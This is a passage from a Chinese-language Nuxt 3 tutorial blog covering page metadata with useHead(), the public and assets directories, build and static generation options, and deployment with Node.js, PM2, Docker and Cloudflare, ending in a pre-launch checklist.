12 13 \u0026lt;script setup\u0026gt; useHead({ title: \u0026#39;Nuxt 3 Blog\u0026#39;, viewport: \u0026#39;width=device-width, initial-scale=1, maximum-scale=1\u0026#39;, charset: \u0026#39;utf-8\u0026#39;, meta: [ { name: \u0026#39;description\u0026#39;, content: \u0026#39;這裡是 Nuxt 3 學習筆記 實戰部落格\u0026#39; } ], bodyAttrs: { class: \u0026#39;test\u0026#39; } }) \u0026lt;/script\u0026gt; useHead() 函數接受參數的類型如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 useHead(meta: Computable\u0026lt;MetaObject\u0026gt;): void interface MetaObject extends Record\u0026lt;string, any\u0026gt; { charset?: string viewport?: string meta?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; link?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; style?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; script?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; noscript?: Array\u0026lt;Record\u0026lt;string, any\u0026gt;\u0026gt; titleTemplate?: string | ((title: string) =\u0026gt; string) title?: string bodyAttrs?: Record\u0026lt;string, any\u0026gt; htmlAttrs?: Record\u0026lt;string, any\u0026gt; } charset：指定 HTML 的字元編碼，預設為 utf-8。 viewport：設定網頁的可見區域，預設為 width=device-width, initial-scale=1。 meta：接受一個陣列，陣列中的每個元素，都將會建立一個 \u0026lt;meta\u0026gt; 標記，元素中物件的屬性將對應至 的屬性。 link：接受一個陣列，陣列中的每個元素，都將會建立一個 \u0026lt;link\u0026gt; 標記，元素中物件的屬性將對應至 的屬性。 style：接受一個陣列，陣列中的每個元素，都將會建立一個 \u0026lt;style\u0026gt; 標記，元素中物件的屬性將對應至 的屬性。 script：接受一個陣列，陣列中的每個元素，都將會建立一個 \u0026lt;script\u0026gt; 標記，元素中物件的屬性將對應至 的屬性。 noscript：接受一個陣列，陣列中的每個元素，都將會建立一個 \u0026lt;noscript\u0026gt; 標記，元素中物件的屬性將對應至 的屬性。 titleTemplage：接受一個字串或函數，用來動態的設定該頁面元件的網頁標題。 title：在頁面元件設置靜態的網頁標題。 bodyAttrs：接受一個物件，設置網頁中 標籤的屬性，物件中的屬性將對應至 的屬性。 htmlAttrs：接受一個物件，設置網頁中 標籤的屬性，物件中的屬性將對應至 的屬性。 自訂 Metadata 使用 useHead() 函數設定屬性所傳入的字串或物件可以是具有響應性的變數，當數值變動時，相對應的數值也會一同響應，例如下面的程式碼，可以動態的變更標題或描述。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) const description = ref(\u0026#39;這裡是 Nuxt 3 學習筆記 實戰部落格\u0026#39;) useHead({ title, meta: [ { name: \u0026#39;description\u0026#39;, content: description } ] }) \u0026lt;/script\u0026gt; 添加動態網頁的標題 我們可以在 app.vue 添加如下程式碼，titleTemplage 中的 %s 將會帶入目前頁面 title 或更上層頁面的 title 屬性：\napp.vue 1 2 3 4 5 6 7 8 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) useHead({ title, titleTemplate: \u0026#39;%s - 首頁\u0026#39;, }) \u0026lt;/script\u0026gt; 可以看到網頁的標題變為「Nuxt 3 Blog - 首頁」。\n你也可以傳入一個函數來動態的添加網頁的標題。\napp.vue 1 2 3 4 5 6 7 8 9 10 \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) useHead({ title, titleTemplate: (title) =\u0026gt; { return title ? `${title} - 首頁` : \u0026#39;首頁\u0026#39; } }) \u0026lt;/script\u0026gt; 添加外部 CSS 我可以使用 useHead() 來添加 Google 字體至 link 屬性之中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;script setup\u0026gt; useHead({ link: [ { rel: \u0026#39;preconnect\u0026#39;, href: \u0026#39;https://fonts.googleapis.com\u0026#39; }, { rel: \u0026#39;stylesheet\u0026#39;, href: \u0026#39;https://fonts.googleapis.com/css2?family=Roboto\u0026amp;display=swap\u0026#39;, crossorigin: \u0026#39;\u0026#39; } ] }) \u0026lt;/script\u0026gt; 添加第三方的 JavaScript 你也可以使用 useHead() 來插入第三方的 JS。\n1 2 3 4 5 6 7 8 9 10 \u0026lt;script setup\u0026gt; useHead({ script: [ { src: \u0026#39;https://third-party-script.com\u0026#39;, body: true } ] }) \u0026lt;/script\u0026gt; 在模板中使用相對應的元件設置屬性及標籤 Nuxt 提供 \u0026lt;Title\u0026gt;、\u0026lt;Base\u0026gt;、\u0026lt;Script\u0026gt;、\u0026lt;NoScript\u0026gt;、\u0026lt;Style\u0026gt;、\u0026lt;Meta\u0026gt;、\u0026lt;Link\u0026gt;、\u0026lt;Body\u0026gt;、\u0026lt;Html\u0026gt; 和 \u0026lt;Head\u0026gt;，我們可以直接在元件中模板 (Template) 使用這些元件進行設定網頁的屬性及標籤。\n因為這些元件名稱與原生 HTML 標記相似，所以記得在模板中使用要開頭為大寫。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;Head\u0026gt; \u0026lt;Title\u0026gt;{{ title }}\u0026lt;/Title\u0026gt; \u0026lt;Meta name=\u0026#34;description\u0026#34; :content=\u0026#34;description\u0026#34; /\u0026gt; \u0026lt;Style type=\u0026#34;text/css\u0026#34; children=\u0026#34;body { background-color: green; }\u0026#34;\u0026gt;\u0026lt;/Style\u0026gt; \u0026lt;/Head\u0026gt; \u0026lt;h1\u0026gt;{{ title }}\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const title = ref(\u0026#39;Nuxt 3 Blog\u0026#39;) const description = ref(\u0026#39;這裡是 Nuxt 3 學習筆記 實戰部落格\u0026#39;) \u0026lt;/script\u0026gt; definePageMeta() 我們其實在前面就有使用過 definePageMeta() 來設置頁面的布局或中間件，在各個頁面之中，我們也可以使用 definePageMeta() 來設置一些屬性與 useHead() 進行搭配。\n例如，我們的 app.vue 使用 useHead 設定的一個 meta，並且是根據 route.meta.title 所動態的設定。\napp.vue 1 2 3 4 5 6 7 \u0026lt;script setup\u0026gt; const route = useRoute() useHead({ meta: [{ name: \u0026#39;og:title\u0026#39;, content: `${route.meta.title} | Nuxt 3 Blog` }] }) \u0026lt;/script\u0026gt; 我們在 pages/articles.vue 添加如下程式碼：\npages/articles.vue 1 2 3 4 5 \u0026lt;script setup\u0026gt; definePageMeta({ title: \u0026#39;所有文章\u0026#39; }) \u0026lt;/script\u0026gt; 當我們瀏覽 /articles 頁面時，Nuxt 在伺服器端就幫我們渲染好 og:title 的 meta 了。我們可以透過檢視原始碼的方式來看看效果。\n在 Nuxt 3 提供了一些可以設置網頁屬性與 Meta 的組合式函數，更能動態的調整與響應，結合 SSR 讓這些標記在伺服器端就能渲染出來，對網站做搜尋引擎最佳化 (SEO) 非常得友善，也是多數人選擇 Nuxt 3 來處理 SSR 與 SEO 的原因。除了 SEO 可能會使用到的標記外，也有 OG Tag 可以加強網頁的連結預覽效果，雖然 OG Tag 與 SEO 沒有絕對的關係，但是透過伺服器端渲染調整這些 Meta 對搜尋引擎或網站都非常的方便，我們只要根據需求及指引做設定，就能對網站的能見度有所提升。\nPublic 與 Assets 資源目錄(Nuxt 3 的靜態資源) 在網站的開發過程中，多少會使用到圖片、樣式或設定字體，而當這些檔案若沒有外部連結或某些需求下需要包含在專案內做使用，最後連帶這些檔案一起部署。在使用 create-vue 建立的 Vue 的專案下包含了 public 與 src 內的 assets 目錄，這兩個目錄都是可以放置這類不常變動的靜態資源，但這兩個目錄各自因為一些特性，建議放置的檔案類型依據使用目的有所區別。\nNuxt 3 使用專案下的兩個目錄來提供使用者處理圖片、樣式或字體，這兩個目錄分別為 public 與 assets。\npublic 目錄 在 Nuxt 3 的專案根目錄下，存在一個名為 public 的目錄，這個目錄如同 Vue 中的 public 目錄或 Nuxt 2 中的 static 目錄。這個目錄下的檔案，將會由 Nuxt 直接於網站的根路徑，例如 / 提供存取。\n例如建立 public/robots.txt 將可以使用 http://localhost:3000/robots.txt 存取。\n通常我們會在 public 目錄放置不常更動的檔案，或是需要保留檔案的名稱，例如 robots.txt 就需要一個固定的名稱，才能正確的被搜尋引擎的爬蟲所解析再決定檢索的規則，抑或 sitemap.xml 與 favicon.ico 檔案等，都很適合放置在 public 目錄。\n你可能也會想，那圖片或 CSS 樣式，我也不常變動，難道就不能放置在 public 目錄嗎？\n行，當然行，哪次不行！\n舉個例子，我們將這張圖片放置於 public 目錄下並命名為 bg.png，專案目錄下其他檔案就先不列，整個結構大概長的像下面這樣。\n1 2 3 4 nuxt-app/ ├── public/ │ └── bg.png └── app.vue 根據規則，我可以使用 http://localhost:3000/bg.png 存取，如下圖我們確實成功的能存取到圖片。\n所以，我們在 app.vue 新增如下程式碼，使用 /bg.png 來等同訪問 public/bg.png 檔案：\napp.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;/bg.png\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 也確實能在網頁中使用 \u0026lt;img src=\u0026quot;/bg.png\u0026quot; /\u0026gt; 來顯示圖片。\n既然 public 目錄已經能提供靜態資源的連結，那麼為什麼還有一個名為 assets 的目錄呢？接下來我們先介紹 assets 目錄，最後再來總結一下差異。\nassets 目錄 Nuxt 3 使用 Vite 或 Webpack 來建構專案進行打包，這些建構工具主要功能是用來處理 JavaScript 檔案將其編譯、轉換或壓縮等，但它們可以透過各自的插件或 Loader 來處理其他檔案類型的資源，例如樣式、字體或 SVG 等。\n舉例來說，我們在 assets 下建立一個 Sass 的樣式，當這個 Sass 檔案被載入使用，就會經過插件或 Loader 來進行 CSS 的預處理及編譯，最終產生一個 CSS 檔案，也可以針對單純的 CSS 檔案進行壓縮。又或者說，當使用 \u0026lt;img\u0026gt; 的 src 屬性設定載入我們放置在 assets 的圖片或圖示，最終需要轉換為 Base64 編碼而不是產生一個連結，我們也需要依賴建構工具插件的擴展來幫助。\n其主要的目的，不外乎就是為了效能與解決瀏覽器的快取。放置在 assets 目錄下的檔案，可能會被插件或 Loader 進行轉換或壓縮，最終產生出來的檔案也具備連結可以進行存取。\n如果使用 public 目錄下導出的 /bg.png，就算我們替換了 bg.png 圖片，可能就會因為檔案根據檔案名稱被瀏覽器快取住，導致前端還是看到舊的檔案。我們在使用 assets 目錄下的檔案時雖然檔名都是 bg.png，但在建構時產生的檔案通常會夾帶 Hash，例如：bg.16a2f98c.png，如此一來我們每次更新圖片，都都會隨機的產生一組 Hash 就能防止瀏覽器快取，導致好像網站更新失效的錯覺。\n舉例來說，我們以相同的圖片，改放置於 assets/bg.png：\n1 2 3 4 nuxt-app/ ├── assets/ │ └── bg.png └── app.vue app.vue 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;~/assets/bg.png\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 在開發環境 ~/assets/bg.png 會轉換為 /_nuxt/assets/bg.png，實際上也能使用 http://localhost:3000/_nuxt/assets/bg.png 進行訪問。\n除了 ~/assets 可以對應 assets 目錄外，也可以參考官方的 alias 更多或自訂別名來使用相對路徑。\n但當你的網站部署完成或啟動建構出來的專案，會發現圖片檔名包含了 Hash，例如 /_nuxt/bg.0a299ea1.png。\n最後我們以最終建構出來的專案結構對比如下圖，在 public 目錄下的檔案，會原封不動的照搬至 .output/public 下，也就可以使用 /bg.png 存取；而放置在 assets 下的檔案，可能會被處理加工，最後檔案名稱會加上一個 Hash 並放置在 .output/public/_nuxt 下，也就需要使用 /_nuxt/bg.0a299ea1.png 存取。\n總結來說多數情況建議把靜態資源放置在 assets，也因為靜態資源多為 SFC 所使用，通常也會放置最多檔案，最後建構時也會因為建構工具的設定來進行轉換或壓縮，最後添加 Hash 來提供存取，也因為每次建構產生的檔案都不一樣，所以不適合直接以完整的 URL 供外部連結使用。而當有些例外情況不適合，例如 robots.txt 或 sitemap.xml 這類的檔案不需要經過額外處理且需要絕對路徑保持檔案名稱，那就得放置在 public 目錄下提供存取。\n發布網站前的建構打包 (Build) 與靜態網站生成 (Static Site Generation) 當網站開發完成或有導入 CI/CD，在準備發布網站前，我們會將 Nuxt 網站的開發專案透過 Nuxt 提供的指令，我們可以來建構出正式環境所需要的版本，這個建構的過程你可以理解為專案將會打包需要的依賴套件、編譯與轉換相關的 Vue SFC 與樣式等，甚至幫你壓縮這些檔案等許多步驟，這些繁瑣的過程都透過 Nuxt 的建構指令來幫你完成，你可以結合一些設定參數與指令，來幫助你建構出正式環境所需要的網站專案，最後再進行部署的動作。\nNuxt 3 專案如何建構正式環境版本？ 當我們建立一個乾淨的 Nuxt 3 專案，可以使用 package.json 中 scripts 內的指令來進行建構或預渲染產生靜態頁面：\n1 2 3 4 5 npm run build npm run generate # or # yarn run build # yarn run generate 或者你也可以使用 Nuxt CLI 來達到一樣的效果：\n1 2 npx nuxi build npx nuxi generate generate 指令會觸發 build 的指令並帶有 prerender 為 true 的參數，最終產生出來的目錄可以直接進行部署，不需要再執行一次 build 的指令。\n使用預設配置進行建構 - 建構通用渲染 (Universal Rendering) 的網站 這邊我們以 【Nuxt3】實戰練習 - 實作部落格 所建立的部落格作為範例，來嘗試以預設的配置進行建構，目前 Nuxt 3 預設 nuxt.config.ts 中 ssr 屬性為 true，也就使用通用渲染 (Universal Rendering)。\n我們進入專案目錄，執行下列指令：\n1 2 3 npm run build # or # yarn run build 不需要在額外的配置或步驟，Nuxt 就會自動幫我們打包並建構出可以部署的網站。\n建構完成後會在專案目錄下多出一個 .output 目錄，public 就是在網站根目錄直接公開打包後的 JS、CSS 圖片等相關檔案。由於通用渲染使用 Nitro 作為服務引擎，所以會需要使用 Node.js 來啟動我們的服務，所以 server 則是會放置伺服器端的 Nitro、Server API 處理邏輯等。\n我們可以先在本地執行下列指令來預覽建構出來的網站與 Nitro 是否能運作正常。\n1 node .output/server/index.mjs 當確認沒問題後，就能以 .output 目錄進行網站部署。\n使用預渲染建置全靜態頁面網站 我們可以在 Nuxt 3 建構時期來進行預渲染 (pre-rendering)，將專案內需要打 API 請求及動態渲染元件的地方，先渲染生成出 HTML 網頁，這個過程也稱之為靜態網站生成 (Static Site Generation)，進而建構出全靜態頁面的網站。\n執行下列指令進行靜態頁面生成：\n1 2 3 npm run generate # or # yarn run generate generate 指令會觸發 build 的指令並帶有 prerender 為 true 的參數，最終會提示產生的目錄 .output/public 可以用來部署至靜態託管伺服器。\n當建構完成後，會在專案目錄下多出一個 .output 目錄同時也會有 dist 目錄，可以發現 .output/public 目錄內容與 dist 目錄相同。\n靜態頁面的生成因為 Nuxt 使用基於爬蟲的技術為每個頁面產生 HTML 與 Payload 檔案，可以發現產生的靜態頁面目錄結構，也對應著我們專案的路由頁面，而頁面元件資料夾內會由一個 index.html 與 _payload.js 組成。\n下圖所產生的結構，是因為我們的部落格資料庫內已經有三筆文章資料，/articles 頁面會取得所有的文章，並列出對應著 /articles/1、/articles/2 與 /articles/3 目錄，每個頁面內也都包含預先從 Server API 請求好的文章資料並存於 _payload.js 之中。\n至此我們就可以將 .output 目錄部署至伺服器或靜態託管服務，而且也不需要在使用 Node.js 伺服器來服務這些靜態檔案。\n手動設定預渲染的路由規則 我們使用 generate 指令所產生的全靜態頁面網站，是基於 Nuxt 的爬蟲技術來分析頁面，如同前個例子文章頁面的產生所描述，如果我們的資料庫存在著 200 筆資料，但 /articles 頁面所打的 API 總是只回傳最新的 10 筆，那麼那些沒有路由連結可以連結過去的文章頁面，就無法被 Nuxt 的爬蟲所分析到，也就無法產生對應的靜態頁面。\n為了解決這個問題，我們可以藉由配置 Nitro 的預渲染路由，來手動的設定哪些頁面要進行預渲染產生靜態頁面，或者忽略產生靜態頁面。\nnuxt.config.ts 1 2 3 4 5 6 7 8 9 export default defineNuxtConfig({ nitro: { prerender: { ignore: [], // 忽略特定路由不進行預渲染 routes: [], // 指定路由進行預渲染 crawlLinks: true // 啟用 Nuxt 爬蟲蒐集頁面連結來進行預渲染 } } }) 當然，也可以搭配 build 或 generate 指令做使用，但會稍微有些不一樣。\nbuild 例如：設置如下，並使用 npm run build 指令。\n1 2 3 4 5 6 7 export default defineNuxtConfig({ nitro: { prerender: { routes: [\u0026#39;/articles\u0026#39;, \u0026#39;/articles/2\u0026#39;] } } }) 那麼建構出來的通用渲染網站，就會包含部分頁面是已經預渲染好的靜態頁面。\ngenerate 當我們使用 generate 時，因為是進行全站的靜態頁面生成，所以基本上涵蓋了所有路由頁面，並且 nitro.prerender.crawlLinks 屬性預設為 true 會啟用 Nuxt 爬蟲來蒐集整的網站的路由頁面，進而開始預渲染產生靜態頁面。\n例如：設置如下，並使用 npm run generate 指令。\n1 2 3 4 5 6 7 8 9 export default defineNuxtConfig({ nitro: { prerender: { ignore: [\u0026#39;/login\u0026#39;, \u0026#39;/register\u0026#39;], routes: [\u0026#39;/articles/2\u0026#39;], crawlLinks: true } }, }) 那麼建構出來的 .output 目錄，就會因為設置了 nitro.prerender.ignore 而忽略 /login 與 /register 頁面的靜態生成 ，而 /articles/2 在網站中因為沒有任何頁面能連結到此，所以 Nuxy 爬蟲無法蒐集到，所以可以手動添加進 nitro.prerender.routes 之中。\n如果我們將 nitro.prerender.crawlLinks 屬性設為 false，那麼在產生靜態頁面的時候，就算 /articles 包含了所有文章的連結，Nuxt 爬蟲也就不會蒐集連結來產生靜態頁面，而是僅依照專案目錄下的 pages 所產生出的路由但不包含 [id].vue 這類動態匹配的路由來產生靜態頁面。\n建構僅在客戶端渲染的網站 同樣的使用部落格作為範例，來嘗試將 nuxt.config.ts 中 ssr 屬性設為 false，也就讓網站僅在客戶端渲染 (Client-side Only Rendering)。\n執行下列指令進行建構：\n1 2 3 npm run build # or # yarn run build 建構完成後，會在專案目錄下多出一個 .output 目錄，可以發現 public 目錄結構與通用渲染建構出的不大一樣，多出了像 Vue 專案建構完成後的 index.html 檔案，來作為顯示的容器。\n這邊比較需要留意的地方是，當我們將 ssr 屬性設為 false，也還是會在 .output 建構出 server 目錄，也擁有著 .output/server/index.mjs。\n那這不就意謂著我還是得有 Node.js 服務才能部署嗎？其實你可以這麼理解，當我們設定 Nuxt 僅在客戶端進行渲染，但 Nuxt 專案中仍然可能有 Server API，這個屬於伺服器端的 API，總不可能一同打包至前端去做架設吧！所以使用 npm run build 建構出來的專案，都會使用 Nitro 引擎來啟動服務，若有 Server API 的處理邏輯，則會連帶打包進 .output/server 目錄之下。\n如果你確定 Nuxt 的專案內沒有自己實作的 Server API，全部是依賴非專案內的 Server API，那麼你可以直接將 public 目錄，視為 Vue 建構出的 dist 目錄來進行部署，因為選擇不再需要 Nitro 引擎來為我們提供 Web Server 的服務，且專案內的前端也都打包完在 public 下可以視為 SPA 網站。\n整理這些排列建構參數的組合 相信看到這裡，可能對建構與產生靜態頁面有一點混亂了，這邊稍微整理了一下，大家可以再依據需求來啟用相對應的配置：\nnpm run build + ssr: true build + ssr: true Nuxt 3 預設的建構參數，使用通用渲染 (Universal Rendering) 模式。\nbuild + ssr: true + nitro.prerender.crawlLinks: true 使用通用渲染模式，頁面中需要打 API 動態產生的連結而被 Nuxt 爬蟲所蒐集到的頁面將被預渲染成靜態頁面。\nbuild + ssr: true + nitro.prerender.routes + nitro.prerender.crawlLinks: false 使用通用渲染模式，但指定頁面預渲染成靜態頁面。\nnpm run build + ssr: false build + ssr: false 僅在客戶端渲染 (Client-side Only Rendering) 的模式，部署時同樣需要使用 server 中的 index.mjs 來啟動 Nitro 伺服器，這樣才能正確的運作 Server API；除非確認專案內完全無依賴專案內的 Server API，則可以直接將 .output/public 視為 Vue 的 dist 目錄進行部署。\nnpm run generate + ssr: true generate + ssr: true 使用預渲染產生靜態頁面，預設產生全站靜態頁面，generate 下 nitro.prerender.crawlLinks 屬性預設變為 true，整個網站包含 Nuxt 爬蟲所蒐集到的頁面將被預渲染成靜態頁面。\ngenerate + ssr: true + nitro.prerender.ignore 使用 generate 已經包含整個網站，如果想要忽略某些頁面進行預渲染，可以添加路由至 nitro.prerender.ignore 中。但是需要注意，這些被忽略的頁面如果有使用專案內的 Server API 需求，可能就無法正確的在靜態託管平台運作，而外部的倒是不受影響。\ngenerate + ssr: true + nitro.prerender.routes 雖然使用 generate 已經包含整個網站，但 Nuxt 爬蟲所蒐集到的頁面僅為頁面中產生的，如果連結不存在這些頁面內，只能直接從瀏覽器網址列輸入進入，那麼我們可以將路由添加至 nitro.prerender.routes 來額外補充需要預渲染的頁面。\ngenerate + ssr: true + nitro.prerender.routes + nitro.prerender.crawlLinks: false 同樣會產生全站靜態頁面，但不使用 Nuxt 爬蟲所蒐集到的連結頁面，所以這些動態匹配或需要打 API 獲取資料再渲染的頁面，將不會是靜態頁面，因此也需要注意，如果這些頁面有使用專案內的 Server API 需求，可能就無法正確的在靜態託管平台運作，而外部的倒是不受影響。\n其它跟建構有關的參數屬性可以再參考官方文件、Vite 與 webpack 建構工具也都能額外設定參數屬性。\nNuxt 的建構指令 build 與產生靜態頁面的 generate 指令，讓我們可以依據不同的情境來決定渲染模式與預渲染的頁面，最終產生的 .output 目錄也會有不一樣的結構。預渲染的頁面與單純的 SPA 也要注意使否有使用到 Nuxt 專案建立的 Server API，再決定是否需要 Nitro 伺服器來啟動正式環境的網站服務。當一切就緒之後最後就能將輸出的目錄打包進行部署。\n就剩最後一步了 - 部署 (Deployment) Nuxt 3 的專案應用程式，可以部署在 Node.js 的伺服器上面，也可以將預渲染的靜態網站由靜態託管平台來服務，或這部署至無伺服器 (serverless) 或 CDN 環境上。\n使用 Node.js 伺服器 Nuxt 3 的專案預設使用 Nitro 來作為服務引擎，所以我們在任何 Node.js 伺服器環境之下，基本上都可以啟動 Nuxt 建置出來的 Nitro Server。\n當我們使用 npm run build 建構專案後，輸出的 .output/server/index.mjs 檔案，即是一個準備啟動 Node 伺服器的入口點。\n我們可以透過下列指令來啟動我們建構好的專案。\n1 node .output/server/index.mjs 執行後如下面圖示顯示，網站將於 Prot: 3000 進行服務監聽。\n你可以設定下列環境變數來調整預設監聽的 Port 或 Host。\nNITRO_PORT 或 PORT：監聽的 Port (預設為 3000) NITRO_HOST 或 HOST：服務的 Host (沒有預設值，但預設監聽所有的網路介面包含 IPv4 與 IPv6 的位址 ) NITRO_SSL_CERT 與 NITRO_SSL_KEY：如果兩者皆設定，將以 HTTPS 模式下啟動伺服器，通常僅作為測試用途，因為建議將 SSL 憑證等設定於提供反向代理的服務，例如 NGINX 或 CloudFlare，Nitro 伺服器則執行在反向代理後面。 部署時，你可以將整個 .output 上傳至正式環境的機器上，並使用 Node.js 做執行，但為了防止我們的服務因為異常，導致 Node.js 服務意外崩潰，我們需要一個 Process 的 Daemon，來將服務常駐，意外崩潰時能自動重啟，來維持整個網站的正常服務。\n通常我們會在正式環境使用 PM2 來管理 Node.js 的服務，PM2 是維持一個 Process 執行的管理器，我們可以藉由 PM2 來啟動我們的 Nitro Server，當服務崩潰時能自動的重新啟動，以維持服務的正常運作，除此之外 PM2 可以啟用叢集 (Cluster) 的功能結合請求的附載平衡，來讓多核心的機器提升資源的利用率與效能，更還有監測多項數據等功能可供正式環境做使用。\n使用 PM2 使用的方式也很簡單，首先使用 NPM 安裝 PM2，可以執行下列指令：\n1 npm install -g pm2 在 Nuxt 專案目錄下建立 ecosystem.config.js 檔案，內容如下：\necosystem.config.js 1 2 3 4 5 6 7 8 9 10 module.exports = { apps: [ { name: \u0026#39;NuxtAppName\u0026#39;, exec_mode: \u0026#39;cluster\u0026#39;, instances: \u0026#39;max\u0026#39;, script: \u0026#39;./.output/server/index.mjs\u0026#39; } ] } 接著我們就能使用 PM2 來執行我們的服務：\n1 pm2 start ecosystem.config.js 你也可以在 ecosystem.config.js 中添加環境變數。\necosystem.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 module.exports = { apps: [ { name: \u0026#39;NuxtAppName\u0026#39;, exec_mode: \u0026#39;cluster\u0026#39;, instances: \u0026#39;max\u0026#39;, script: \u0026#39;./.output/server/index.mjs\u0026#39;, env: { NITRO_PORT: 3001, NITRO_HOST: \u0026#39;127.0.0.1\u0026#39; } } ] } 製作 Docker Image 目前使用 Docker 來部署服務的也不在少數，個人也是採用容器化來啟動網站服務並整合 CI/CD 自動化的流程來建構與部署 Nuxt 3 專案，以下將列出自己使用的 Dockerfile，有興趣的可以再參考看看。\n專案目錄下建立 Dockerfile 檔案，內容如下：\nDockerfile 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 FROM node:16-alpine AS builder RUN mkdir -p /nuxt-app WORKDIR /nuxt-app COPY . . RUN npm ci \u0026amp;\u0026amp; npm cache clean --force RUN npm run build FROM keymetrics/pm2:16-alpine RUN mkdir -p /nuxt-app/.output WORKDIR /nuxt-app/.output COPY --from=builder /nuxt-app/.output . COPY ./ecosystem.config.js /nuxt-app ENV NUXT_HOST=0.0.0.0 ENV NUXT_PORT=3000 EXPOSE 3000 ENTRYPOINT [\u0026#34;pm2-runtime\u0026#34;, \u0026#34;start\u0026#34;, \u0026#34;/nuxt-app/ecosystem.config.js\u0026#34;] 打開終端機 (Terminal)，並於專案目錄下執行下列指令：\n1 docker build -t nuxt-app . 當開始製作 Docker Image 時，會依照 Dockerfile 來建置，主要分成兩個部分，首先我會先在 node:16-alpine 容器環境中執行建構 (build) 的指令，並將需要部署的目錄 .output 複製至 keymetrics/pm2:16-alpine 容器環境中，這樣最終使用 PM2 執行服務的 Image 大小就會稍微小一些。\n當 Docker Image 製作完畢後，可以再藉由 docker run 或 docker compose 甚至 k8s 來啟動服務後，再由如 NGINX 提供反向代理服務連接到內部的 Nitro Server。\n部署至 CloudFlare Workers 我們也可以將 Nuxt 部署到無伺服器 (Serverless) 的環境，官方提供了多種的預設部署可以做使用，我們就簡單以一個乾淨的 Nuxt 3 專案來做範例，嘗試部署到 CloudFlare Workers。\n首先，我們先準備一個 Nuxt 3 專案，在此我使用下列指令建立一個乾淨的 Nuxt 3 專案，並進入專案目錄安裝套件：\n1 2 3 npx nuxi init nuxt-app cd nuxt-app npm install 使用 NPM 安裝 wrangler，它是用於建構 Cloudflare Workers 的命令列工具 (command line tool)。\n1 npm install -g wrangler 你可能需要註冊一個 CloudFlare 的帳號，並使用下列指令來登入 CloudFlare 帳號並授權 Wrangler 來建立 CloudFlare Workers，我們選擇允許 (Allow) 即可。\n1 wrangler login 於專案目錄下建立 wrangler.toml 內容如下：\nwrangler.toml 1 2 3 4 5 6 7 name = \u0026#34;nuxt-app-hello\u0026#34; main = \u0026#34;./.output/server/index.mjs\u0026#34; workers_dev = true compatibility_date = \u0026#34;2022-10-15\u0026#34; [site] bucket = \u0026#34;.output/public\u0026#34; 我們將 NITRO_PRESET 環境變數，設置為 cloudflare 並開始建構我們的專案。\n1 NITRO_PRESET=cloudflare npm run build 接下來，可以選擇執行終端機提示的指令來啟動伺服器進行相關測試。\n1 npx wrangler dev .output/server/index.mjs --site .output/public --local 當確認專案服務運作上沒問題後，可以執行下列指令進行發布。\n1 npx wrangler publish 完成發布後，就會提示我們發布完成及服務的網址，例如 https://nuxt-app-hello.ryanchien8125.workers.dev，我們就可以瀏覽我們部署好的網站囉。\n靜態的網站部署至 CloudFlare Pages 我們使用 Nuxt 3 可以預渲染全靜態的網站，因此也可以將專案部署至靜態託管平台，以 CloudFlare Pages 為例，部署的步驟如下：\n首先，先執行下列指令進行全站的預渲染：\n1 2 3 npm run generate # or # yarn run generate 使用 NPM 安裝 wrangler。\n1 npm install -g wrangler 你可能需要註冊一個 CloudFlare 的帳號，並使用下列指令來登入 CloudFlare 帳號並授權 Wrangler，我們選擇允許 (Allow) 即可。\n1 wrangler login 建立一個 CloudFlare Pages 名為 nuxt-app-blog。\n1 wrangler pages project create nuxt-app-blog 使用下列指令，將預渲染的網站目錄進行部署，並指定專案名稱為 nuxt-app-blog：\n1 wrangler pages publish ./.output/public --project-name nuxt-app-blog 當部署完成後，就會得到一個連結來查看部署的靜態網頁，你也可以從 CloudFlare Pages 後台，看見網站網址的別名 Aliases 來使用自訂的網址。\n以上是介紹 Nuxt 3 的幾個部署方式的例子，更多雲端平台上面的部署，也可以參考 Nuxt 與 Nitro 官方文件。\n上線前的測試項目 最後與大家分享一下網站專案上線前的幾個我會特別注意的幾個小細節，也歡迎大家一起來交流。\n前端細節 網頁的標題 (Title) 使用之資源授權 (使用權、智財權) 圖片替代文字 Favicon HTML Meta data Google Analytics 瀏覽器相容性測試 RWD 跨瀏覽器 BrowserStack Comparium TestingBot API 測試 單元測試 不同場景測試 (測試環境、正式環境) 效能測試 JMeter k6 安全性測試 壓力測試 模擬使用者或連線數 觀察機器資源使用量 資料庫連線數觀察 持續提高模擬數量觀察分析 分析每個請求於併發的平均響應時間 是否請求中夾雜非預期之狀態碼 (HTTP Status Code) API 或網站安全性 參考 OWASP Top 10 SQL 參數化查詢 資安公司滲透測試、紅隊演練 開發或除錯用的訊息 警告訊息或異常訊息移除（console.log 或警告訊息等） JavaScript Source Maps 記得移除 敏感資訊記得移除 (開發用 Key、帳號密碼等) 網站相依性檢查 使用到第三方網站資源及穩定性 檢查所有網址皆能正常運作 當第三方網站異常時應對措施 部署相關 是否有高可用性 (HA) Docker 或 Kubernetes 整合 網域時效 SSL 證書日期 防火牆或 WAF 設定 內網或外網區隔 備份機制 靜態有狀態資料 (使用者上傳的) 資料庫資料 這邊主要與大家分享幾種 Nuxt 